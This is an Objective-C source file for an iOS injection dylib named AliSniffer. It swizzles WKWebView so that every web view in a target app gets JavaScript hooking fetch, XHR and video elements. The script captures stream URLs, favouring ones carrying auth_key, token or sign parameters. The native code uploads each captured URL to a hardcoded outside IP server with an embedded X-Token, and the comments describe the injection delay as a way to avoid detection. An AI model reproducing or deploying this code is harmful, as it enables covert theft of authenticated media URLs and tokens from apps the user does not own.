// AliSniffer.m
// WKWebView JS injector + native handler for capturing stream URLs (auth_key 优先)
// Safety: requires compile-time macro ALLOW_ALISNIFFER_INJECTION=1 and bundle id whitelist to actually enable.
// Usage: compile into your dylib and inject into target app; it hooks WKWebView init to add script and message handler.

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

#pragma mark - CONFIGURATION (Change as necessary)

// If you want this code to actually inject in a build, define ALLOW_ALISNIFFER_INJECTION=1 in your build settings.
// Example in Xcode: Other C Flags: -DALLOW_ALISNIFFER_INJECTION=1
#ifndef ALLOW_ALISNIFFER_INJECTION
#warning "ALLOW_ALISNIFFER_INJECTION not defined — AliSniffer injection disabled at compile time. Define -DALLOW_ALISNIFFER_INJECTION=1 to enable."
#endif

// Bundle IDs allowed to run injection. Set to apps you own / have rights to test.
// If empty array => injection disabled (extra safety).
static NSArray<NSString*> *kAllowedBundleIDs(void){
    return @[
        @"com.yourcompany.yourapp",   // <- replace with your app bundle id(s)
        // @"com.other.app"
    ];
}

// Delay (seconds) after WKWebView init before adding script (helps avoid early-detection).
static const NSTimeInterval kInjectionDelaySeconds = 1.5;

// JS to inject: watches fetch/XHR/video and posts messages to window.webkit.messageHandlers.alisniffer
static NSString * const kInjectorJS = @"(function(){\
if (window.__alisniffer_installed) return; window.__alisniffer_installed = true;\
function post(url, src){try{ if(!url) return; var msg={url:url,src:src||location.href,t:Date.now()}; if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.alisniffer){ window.webkit.messageHandlers.alisniffer.postMessage(msg); } else { console.log('AliSniffer msg', msg); }}catch(e){} }\
var seen = {}; function seenOnce(u){ if(!u) return false; if(seen[u]) return true; seen[u]=Date.now(); return false; }\
(function(origOpen){ XMLHttpRequest.prototype.open = function(method,url){ try{ if(url && !seenOnce(url)) post(url,'xhr'); }catch(e){} return origOpen.apply(this,arguments); }; })(XMLHttpRequest.prototype.open);\
(function(origFetch){ window.fetch = function(resource, init){ try{ var u = (typeof resource==='string') ? resource : (resource && resource.url) || ''; if(u && !seenOnce(u)) post(u,'fetch'); }catch(e){} return origFetch.apply(this,arguments); }; })(window.fetch);\
function scanDOMForStreams(root){ try{ root = root || document; var videos = root.querySelectorAll && root.querySelectorAll('video, source'); if(videos && videos.length){ videos.forEach(function(v){ try{ var src = v.currentSrc || v.src || (v.getAttribute && v.getAttribute('src')); if(src && !seenOnce(src)) post(src,'video'); if(v.tagName && v.tagName.toLowerCase()==='video'){ var cs = v.querySelectorAll('source'); cs.forEach(function(s){ var ssrc = s.src || s.getAttribute && s.getAttribute('src'); if(ssrc && !seenOnce(ssrc)) post(ssrc,'source'); }); } }catch(e){} }); } var els = root.querySelectorAll && root.querySelectorAll('a,iframe,script,img,link'); if(els && els.length) { els.forEach(function(el){ try{ var urls=[el.src, el.href, el.getAttribute && el.getAttribute('data-src')]; urls.forEach(function(u){ if(!u) return; var s=u.toLowerCase(); if(s.indexOf('.m3u8')>=0||s.indexOf('.flv')>=0||s.indexOf('.mp4')>=0||s.indexOf('auth_key=')>=0||s.indexOf('weizan')>=0||s.indexOf('vzan')>=0||s.indexOf('phonelive')>=0){ if(!seenOnce(u)) post(u,'link'); } }); }catch(e){} }); } }catch(e){} }\
scanDOMForStreams(document);\
try{ var mo = new MutationObserver(function(records){ records.forEach(function(r){ try{ if(r.addedNodes && r.addedNodes.length){ r.addedNodes.forEach(function(n){ if(n.nodeType===1) scanDOMForStreams(n); }); } }catch(e){} }); }); mo.observe(document,{childList:true, subtree:true}); }catch(e){};\
try{ var vids = document.querySelectorAll && document.querySelectorAll('video'); vids.forEach(function(v){ try{ v.addEventListener('loadedmetadata', function(){ if(v.currentSrc && !seenOnce(v.currentSrc)) post(v.currentSrc,'video-loaded'); }, true); v.addEventListener('play', function(){ if(v.currentSrc && !seenOnce(v.currentSrc)) post(v.currentSrc,'video-play'); }, true); }catch(e){} }); var mo2 = new MutationObserver(function(records){ records.forEach(function(r){ r.addedNodes && Array.prototype.slice.call(r.addedNodes).forEach(function(n){ try{ if(n.tagName && n.tagName.toLowerCase()==='video'){ n.addEventListener('loadedmetadata', function(){ if(n.currentSrc && !seenOnce(n.currentSrc)) post(n.currentSrc,'video-loaded'); }, true); } }catch(e){} }); }); }); mo2.observe(document,{childList:true, subtree:true}); }catch(e){} })();";

#pragma mark - Utilities

static inline BOOL bundleAllowed(void){
    NSArray *allowed = kAllowedBundleIDs();
    if (!allowed || allowed.count==0) return NO;
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier] ?: @"";
    for (NSString *a in allowed) if ([bid isEqualToString:a]) return YES;
    return NO;
}

static inline void run_on_main(void(^blk)(void)){
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

#pragma mark - Message Handling & Local Actions

// Basic dedupe map for native-side to avoid spam
static NSMutableDictionary<NSString*, NSDate*> *g_seenNative;
static dispatch_queue_t g_seenQ;

static BOOL native_seen_once(NSString *url){
    if (!url) return YES;
    __block BOOL seen = NO;
    dispatch_sync(g_seenQ, ^{
        NSDate *last = g_seenNative[url];
        if (last && [[NSDate date] timeIntervalSinceDate:last] < 60.0) seen = YES;
        else g_seenNative[url] = [NSDate date];
    });
    return seen;
}

// Minimal popup helper
static void popup_native(NSString *title, NSString *msg, NSString *copyURL){
    if (!msg) return;
    run_on_main(^{
        @try{
            UIViewController *root = UIApplication.sharedApplication.keyWindow.rootViewController;
            UIViewController *vc = root;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyURL.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction * _Nonnull action){
                    [UIPasteboard.generalPasteboard setString:copyURL];
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(NSException *e){}
    });
}

// Simple uploader (non-blocking, best-effort). Customize endpoint & headers as needed.
static void native_upload_url(NSString *url){
    if (!url) return;
    // Example: post to your server (replace with your endpoint)
    NSString *endpoint = @"http://139.155.57.242:8088/api/push_raw";
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:endpoint] cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:6.0];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:@"@Yy166431" forHTTPHeaderField:@"X-Token"]; // optional token header
    NSString *body = url;
    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.requestCachePolicy = NSURLRequestReloadIgnoringLocalCacheData;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg];
    [[[s dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *error){
        // ignore
    }] resume];
}

#pragma mark - WKScriptMessageHandler

@interface AliSnifferWKHandler : NSObject <WKScriptMessageHandler>
@end

@implementation AliSnifferWKHandler

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.name isEqualToString:@"alisniffer"]) return;
    id body = message.body;
    if (![body isKindOfClass:NSDictionary.class]) return;
    NSString *url = body[@"url"];
    NSString *source = body[@"src"] ?: @"js";
    if (!url || url.length==0) return;
    // quick native dedupe
    if (native_seen_once(url)) return;
    // prefer auth_key urls — simple check
    BOOL hasAuth = ([[url lowercaseString] containsString:@"auth_key="] || [[url lowercaseString] containsString:@"token="] || [[url lowercaseString] containsString:@"sign="]);
    NSString *title = hasAuth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    // popup and copy
    popup_native(title, url, url);
    // upload
    native_upload_url(url);
}

@end

#pragma mark - WKWebView init swizzle (install user script into configuration)

static id original_initWithFrame_config = nil;

static void ali_inject_user_script_if_needed(WKWebViewConfiguration *config){
#ifdef ALLOW_ALISNIFFER_INJECTION
    if (!config) return;
    // ensure bundle allowed
    if (!bundleAllowed()) return;
    // ensure handler not already added
    @try {
        WKUserContentController *uc = config.userContentController;
        if (!uc) return;
        // Prevent double-add: check for existing handler name
        BOOL already = NO;
        // There is no public API to check handlers; we simply add in a safe manner and rely on try/catch
        AliSnifferWKHandler *handler = [AliSnifferWKHandler new];
        // Add script
        WKUserScript *us = [[WKUserScript alloc] initWithSource:kInjectorJS injectionTime:WKUserScriptInjectionTimeAtDocumentEnd forMainFrameOnly:YES];
        // Add after a small delay on main thread (helps avoid some detection)
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectionDelaySeconds * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                // add user script and handler
                [uc addUserScript:us];
                [uc addScriptMessageHandler:handler name:@"alisniffer"];
                // show a simple popup to indicate loaded
                popup_native(@"AliSniffer 已加载", @"JS 注入已安装（监听 fetch/XHR/video/dom），将被动捕获播放 URL 并上报。", nil);
            } @catch (NSException *ex) {
                // swallow
            }
        });
    } @catch (NSException *e) {}
#else
    // injection disabled at compile time
#endif
}

static WKWebView *ali_initWithFrame_config(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *configuration){
    // call original initializer
    WKWebView * (*orig)(id, SEL, CGRect, WKWebViewConfiguration *) = (void*)original_initWithFrame_config;
    WKWebView *webview = nil;
    if (orig) webview = orig(self, _cmd, frame, configuration);
    // attempt injection
    ali_inject_user_script_if_needed(configuration);
    return webview;
}

#pragma mark - Constructor installs swizzle

__attribute__((constructor))
static void AliSnifferInstall(void){
    @try {
        g_seenQ = dispatch_queue_create("com.alisniffer.seenq", DISPATCH_QUEUE_SERIAL);
        g_seenNative = [NSMutableDictionary dictionary];
        // swizzle WKWebView -initWithFrame:configuration:
        Class cls = NSClassFromString(@"WKWebView");
        if (cls) {
            SEL sel = NSSelectorFromString(@"initWithFrame:configuration:");
            Method m = class_getInstanceMethod(cls, sel);
            if (m) {
                IMP imp = (IMP)ali_initWithFrame_config;
                original_initWithFrame_config = (id)method_getImplementation(m);
                method_setImplementation(m, imp);
            } else {
                // could not find method; fallback: try initWithCoder: later (not handled here)
            }
        }
    } @catch (NSException *e) {
        // swallow
    }
}

#pragma mark - End of file
